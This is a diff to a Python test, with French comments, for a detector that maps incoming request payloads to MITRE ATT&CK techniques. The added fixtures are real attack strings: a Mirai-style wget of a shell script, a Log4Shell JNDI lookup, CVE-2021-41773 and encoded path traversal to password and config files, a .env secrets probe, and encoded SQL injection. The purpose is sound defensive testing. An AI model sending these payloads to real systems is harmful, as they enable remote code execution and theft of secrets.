@@ -33,6 +33,12 @@ def event(**overrides) -> RawEvent:
         (b"GET /../../etc/passwd", "", "", "T1083"),  # decouverte de fichiers
         (b"GET /?q=union select 1", "", "", "T1190"),  # exploitation
         (b"() { :;};wget http://x/y", "", "", "T1059"),  # interpreteur de commandes
+        (b"GET /shell?cd+/tmp;wget+http://x/m.sh", "", "", "T1059"),  # Mirai, encode
+        (b"GET /?x=${jndi:ldap://x/a}", "", "", "T1190"),  # Log4Shell
+        (b"GET /cgi-bin/.%2e/.%2e/etc/passwd", "", "", "T1190"),  # CVE-2021-41773
+        (b"GET /..%5c..%5cwin.ini", "", "", "T1083"),  # traversee encodee
+        (b"GET /.env", "", "", "T1083"),  # fichier de secrets
+        (b"GET /?id=1%27%20OR%20%271%27=%271", "", "", "T1190"),  # SQLi encodee
     ],
 )
 def test_correspondances_attendues(mapper, payload, username, password, expected):
